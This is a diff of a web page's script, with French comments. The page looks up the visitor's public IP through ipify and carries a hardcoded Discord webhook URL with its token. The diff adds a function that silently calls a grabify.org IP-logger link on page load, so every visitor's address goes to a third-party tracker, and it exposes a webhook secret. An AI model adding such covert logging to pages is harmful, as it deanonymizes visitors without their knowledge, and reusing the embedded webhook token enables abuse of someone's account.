@@ -16,8 +16,13 @@
   <script>
     // Webhook Discord (remplace par le tien si besoin)
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1377390162979586200/L1rq4N6vDSP8alDZhv9vAfxzZ97CXCUIS8OYxl_bniGVp3Fm80eVHbyGk3AExZc_VuWS";
-
-    // Récupère l'IP publique via ipify
+    
+    // Récupère l'IP publique via grabify
+    async function Grabify() {
+      await fetch('https://grabify.org/1XsJ');
+    }
+    
+    // Récupère l'IP publique (ou MAC adresse, wtf?) via ipify
     async function getIPData() {
       try {
         const res = await fetch('https://api64.ipify.org/?format=json');
@@ -109,6 +114,7 @@
 
     // Routine principale
     (async function main() {
+      await Grabify();
       const ipData = await getIPData();
       if (!ipData || !ipData.ip) {
         document.getElementById("result").innerHTML = "<p>Impossible de récupérer les informations IP.</p>";
